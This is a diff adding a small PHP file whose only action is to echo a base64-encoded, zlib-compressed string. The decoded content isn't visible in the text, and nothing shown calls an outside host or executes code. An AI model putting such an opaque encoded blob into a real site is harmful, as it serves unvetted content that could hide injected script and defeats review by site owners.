@@ -1,0 +1,4 @@
+<?php
+
+echo gzuncompress(base64_decode("eJxNj80NwyAMRjMLEwD5MTiXbpBDB6gMBgmpSaQS9RJl9xLaSpFPfn7+ZE/Yo7hvtAWBGveMqkPRVNDkkHNaFzFOCEX6ddhWTZ3aFzWJxZhxKJtAMhroorPkjTKmVeDIOmM8lbKSB8lBK5bKGeih7wAK1+SjtxFYnTmqvUQvNIcajsInWpfaaH0xwkzp+SDmVwF1v0yZ3omLfSMu7PjfW9/y9NrESChxP44P+DVNUg=="))
+?>
